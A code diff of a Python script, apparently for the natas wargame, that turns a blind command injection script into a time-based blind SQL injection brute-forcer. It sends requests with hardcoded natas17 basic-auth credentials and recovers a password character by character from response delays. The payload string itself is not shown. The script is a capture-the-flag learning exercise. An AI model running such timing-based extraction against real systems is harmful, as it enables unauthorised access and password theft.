@@ -1,4 +1,4 @@
-#Blind Command Injecion Script for natas16
+#Blind SQL Injection (real time)
 
 import requests
 import string
@@ -16,13 +16,12 @@ for x in range(32):
         url_params = {
         "needle": payload
         }     
-        httpresponse = requests.get(url, params=url_params,auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"))       
-        if "Africans" not in httpresponse.text :
-            print(httpresponse.text)
-        else:
-            print(httpresponse.text)
-            
-        #request para payload
+        httpresponse = requests.get(url, params=url_params,auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")) 
+             
+        if httpresponse.elapsed.total_seconds() >= 5:  #blind real time sql timeline server request
+            password += y
+            print(password)
+            break
 
 
 
